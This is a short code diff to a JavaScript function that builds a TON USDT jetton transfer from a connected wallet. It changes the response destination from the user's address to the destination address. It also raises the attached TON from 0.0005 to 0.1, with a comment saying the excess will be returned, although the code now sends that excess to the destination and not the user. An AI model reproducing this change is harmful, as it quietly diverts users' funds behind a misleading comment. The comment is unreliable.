@@ -46,9 +46,12 @@ async function connectWallet() {
       "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
     );
 
+
+
     const usdtMaster = tonClient.value.open(
       JettonMaster.create(usdtMasterAddress)
     );
+    
     const usdtWallet = await usdtMaster.getWalletAddress(userAddress);
     console.log("usdtWallet", usdtWallet.toString());
 
@@ -57,7 +60,7 @@ async function connectWallet() {
       .storeUint(0, 64)
       .storeCoins(toNano("0.1"))
       .storeAddress(destinationAddress)
-      .storeAddress(userAddress)
+      .storeAddress(destinationAddress)
       .storeUint(0, 1)
       .storeCoins(toNano("0.0001"))
       .storeUint(0, 1)
@@ -68,7 +71,7 @@ async function connectWallet() {
       messages: [
         {
           address: usdtWallet.toString(),
-          amount: toNano("0.0005").toString(),
+          amount: toNano("0.1").toString(), // for gas fees, excess will be returned
           payload: body.toBoc().toString("base64"),
         },
       ],
